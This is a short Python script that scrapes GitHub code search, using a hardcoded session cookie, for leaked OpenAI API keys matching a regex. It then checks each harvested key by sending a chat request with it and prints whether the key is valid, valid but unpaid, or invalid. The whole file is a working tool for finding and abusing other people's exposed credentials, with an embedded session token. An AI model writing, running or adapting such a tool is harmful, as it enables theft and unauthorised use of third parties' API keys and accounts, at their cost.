import re
import requests
from openai import OpenAI  # Import the OpenAI class

GITHUB_COOKIE_SESSION = "9A7YS8FbpBr6hRtLPFQWN76duVKCaMPyHwNSI-aFfcn1sWUx"

print("Searching for API KEYS....")

regex = r"sk-[a-zA-Z0-9]*T3BlbkFJ[a-zA-Z0-9]*"

cookies = {'user_session': GITHUB_COOKIE_SESSION}

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0',
    'Accept': 'application/json',
}

matches = []
for i in range(1, 6):
    params = {'q': f'/{regex}/', 'type': 'code', 'p': i}
    response = requests.get('https://github.com/search', params=params, cookies=cookies, headers=headers)
    matches += re.findall(regex, response.text)

print(f"FOUND:\033[95m {len(matches)} keys\033[00m")

print("Checking API KEYS....")
for match in matches:
    try:
        # Instantiate an OpenAI client with the current key
        client = OpenAI(api_key=match)

        # Test the key by creating a chat completion
        chat_completion = client.chat.completions.create(
            messages=[
                {
                    "role": "user",
                    "content": "Say this is a test",
                }
            ],
            model="gpt-4o",
        )
        print(f"{match}: API key is:\033[92m VALID\033[00m")
    except Exception as e:
        if "quota" in str(e).lower():
            print(f"{match}: API key:\033[93m VALID but not PAID\033[00m")
        elif "invalid" in str(e).lower():
            print(f"{match}: API key is:\033[91m NOT VALID\033[00m")
        else:
            print(f"{match}: Unknown error: {e}")
